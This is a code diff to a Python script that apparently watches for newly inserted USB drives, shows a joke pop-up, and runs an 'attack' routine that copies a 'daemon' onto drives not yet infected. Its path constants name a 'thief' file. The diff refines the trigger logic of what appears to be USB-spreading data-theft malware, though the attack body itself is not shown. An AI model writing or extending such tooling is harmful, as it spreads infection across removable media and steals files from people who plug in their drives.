@@ -7,6 +7,7 @@ import win32con
 import win32api
 import shutil
 import subprocess
+from tkinter import messagebox
 
 DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
 THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
@@ -30,7 +31,7 @@ class computer:
 
 
 class usb:
-    drive="" #此变量用于记录u盘的盘符
+    drive="NULL" #此变量用于记录u盘的盘符
     def __init__(self):
         disks=psutil.disk_partitions()
         for d in disks:
@@ -59,11 +60,14 @@ c1=computer()
 while True:
     time.sleep(3)
     print(c1.get_sum(),c1.drive_sum)
-    if c1.get_sum()!=c1.drive_sum: 
-        print("SSS")
+    if c1.get_sum()>c1.drive_sum: 
+        usb1=usb()
+        messagebox.showinfo(title="消息提示", message="欢迎来到德莱联盟")
+        if usb1.drive=="NULL" or os.path.exists(usb1.drive+DAEMON_NAME): #没探测到FAT32文件系统所在的分区或u盘已被攻击
+            continue 
         break
 
-usb1=usb()
+
 if not(os.path.exists(usb1.drive+DAEMON_NAME)):
     usb1.attack()
 
